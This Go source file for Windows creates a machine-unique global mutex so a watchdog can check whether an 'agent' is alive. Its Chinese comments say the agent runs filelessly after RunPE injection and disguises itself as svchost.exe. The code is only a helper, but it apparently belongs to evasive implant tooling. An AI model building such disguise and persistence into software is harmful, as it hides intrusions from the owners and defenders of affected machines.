//go:build windows

package main

import (
	"crypto/sha256"
	"fmt"
	"syscall"
	"unsafe"
)

// ═══ 命名互斥体 ═══
// 用于无文件模式下检测 agent 进程是否存活
// RunPE 注入后进程名变为 svchost.exe，无法通过进程名检测
// 使用 Global\ 命名空间的 Mutex 作为唯一标识

// procCreateMutexW 已在 singleton_windows.go 中声明，此处复用

// getAgentMutexName 获取本机唯一的 Mutex 名称
func getAgentMutexName() string {
	mid, _ := getMachineID()
	if mid == "" {
		mid = "fallback"
	}
	h := sha256.Sum256([]byte(mid + "|mutex|v1"))
	return fmt.Sprintf(`Global\sm_%x`, h[:8])
}

// createAgentMutex 创建全局命名互斥体（进程生命周期内持有）
// 看门狗通过尝试打开此 Mutex 判断 agent 是否存活
func createAgentMutex() {
	name, _ := syscall.UTF16PtrFromString(getAgentMutexName())
	// 不保存 handle，进程退出时 Windows 自动释放
	procCreateMutexW.Call(0, 0, uintptr(unsafe.Pointer(name)))
}
